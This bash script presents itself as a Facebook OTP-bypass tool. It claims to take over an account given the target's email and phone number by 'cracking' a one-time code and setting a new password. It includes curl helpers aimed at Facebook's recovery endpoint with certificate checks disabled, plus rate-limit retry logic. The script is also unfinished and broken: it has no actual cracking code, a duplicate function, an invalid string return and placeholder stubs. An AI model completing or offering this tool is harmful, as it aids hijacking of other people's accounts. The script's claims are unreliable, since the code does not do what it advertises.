
#!/bin/bash

echo "
.########....###.....######..########.########...#######...#######..##....##..........##.....##....###.....######..##....##.####.##....##..######
.##.........##.##...##....##.##.......##.....##.##.....##.##.....##.##...##...........##.....##...##.##...##....##.##...##...##..###...##.##....##..............##....##.....##.##.....##.##......
.##........##...##..##.......##.......##.....##.##.....##.##.....##.##..##............##.....##..##...##..##.......##..##....##..####..##.##....................##....##.....##.##.....##.##......
.######...##.....##.##.......######...########..##.....##.##.....##.#####.............#########.##.....##.##.......#####.....##..##.##.##.##...####.............##....##.....##.##.....##.##......
.##.......#########.##.......##.......##.....##.##.....##.##.....##.##..##............##.....##.#########.##.......##..##....##..##..####.##....##..............##....##.....##.##.....##.##......
.##.......##.....##.##....##.##.......##.....##.##.....##.##.....##.##...##...........##.....##.##.....##.##....##.##...##...##..##...###.##....##..............##....##.....##.##.....##.##......
.##.......##.....##..######..########.########...#######...#######..##....##..........##.....##.##.....##..######..##....##.####.##....##..######...............########..#######...#######..########
"

# This script recovers a Facebook password using a cracked OTP and changes the password.

# USAGE:
# ./Fb_otp_bypass.sh <email> <phone_number> <new_password>

# EMAIL and PHONE_NUMBER must be valid.

# Example:
# ./Fb_otp_bypass.sh richmond@example.com +2376537127 newpassword123

# Function to check if the user has entered a valid email address
function check_email_address() {
  if ! [[ $1 =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
    echo "Invalid email address."
    exit 1
  fi
}

# Function to check if the user has entered a valid phone number
function check_phone_number() {
  if ! [[ $1 =~ ^\+[0-9]{1,3}[0-9]{7,14}$ ]]; then
    echo "Invalid phone number."
    exit 1
  fi
}

# Prompt the user to enter the OTP if they have it
function get_otp() {
  echo "Do you have an OTP? (y/n)"
  read -r has_otp

  if [[ $has_otp == "y" ]]; then
    echo "Enter the OTP you have already tried: "
    read -rs otp

    if [[ -n $otp ]]; then
      return $otp
    fi
  fi
  return ""
}

# Set the curl command options
CURL_OPTIONS="-i -s -k -X GET"

# Function to get the headers and cookies from the URL
function get_headers_and_cookies() {
  local

url="https://www.facebook.com/recover/code/?ph%5B0%5D=$1"
  headers=$(curl $CURL_OPTIONS "$url")

  # Extract the cookies from the headers
  cookies=$(grep -Po "Set-Cookie: \K[^;]*" <<< "$headers")

  echo "$headers"
  echo "$cookies"
}

# Function to make a POST request
function make_post_request() {
  local headers=$1
  local cookies=$2
  local post_data=$3
  local url=$4
  response=$(curl $CURL_OPTIONS "$headers" -b "$cookies" --data-binary "$post_data" "$url")

  echo "$response"
}

# Function to check if the OTP was correct
function check_otp_correct() {
  local response=$1

  if grep -q "Password changed successfully" <<< "$response"; then
    echo "true"
  else
    echo "false"
  fi
}

# Function to change the password using the cracked OTP
function change_password() {
  local headers=$1
  local cookies=$2
  local new_password=$3
  local url=$4
  change_password_response=$(curl $CURL_OPTIONS "$headers" -b "$cookies" --data "new_password=$new_password" "$url")

  echo "$change_password_response"
}

# Function to check if the password was changed successfully
function check_password_changed() {
  local response=$1

  if grep -q "Password successfully changed" <<< "$response"; then
    echo "true"
  else
    echo "false"
  fi
}

# Function to handle rate limiting
function handle_rate_limiting() {
  local response=$1

  if grep -q "Too many requests" <<< "$response"; then
    echo "Rate limited. Retrying in 60 seconds..."
    sleep 60
    return 1
  fi

  return 0
}

# Function to check if the new password is strong enough
function check_password_strength() {
  local new_password=$1

  # Add your code here to check password strength
  # Example: use a password strength checker library, or implement your own logic

  return 0
}

# Function to change the password for a Facebook account
function change_password() {
  local phone_number="$1"
  local email_address="$2"
  local new_password="$3"

  # Check if the phone number or email address is provided
  if [[ -n "$phone_number" ]]; then
    # Change password using phone number
    echo "Changing password for Facebook account with phone number: $phone_number"
    # Add your code here to change the password using the phone number
    # Make use of the provided functions like get_otp, get_headers_and_cookies,
    # make_post_request, check_otp_correct, change_password, etc.

  elif [[ -n "$email_address" ]]; then
    # Change password using email address
    echo "Changing password for Facebook account with email address: $email_address"
    # Add your code here to change the password using the email address
    # Make use of the provided functions like get_otp, get_headers_and_cookies,
    # make_post_request, check_otp_correct, change_password, etc.

  else
    echo "Error: Phone number or email address is required."
    return 1
  fi

  # Check if the password strength is sufficient
  if ! check_password_strength "$new_password"; then
    echo "Error: The new password is not strong enough."
    return 1
  fi

  # Set the new password
  echo "Setting new password: $new_password"
  # Add your code here to set the new password

  # Check if the password change was successful
  if check_password_changed "$change_password_response"; then
    echo "Password changed successfully."
    return 0
  else
    echo "Error: Failed to change password."
    return 1
  fi
}

# Example usage
#change_password "1234567890" "" "new_password"

 
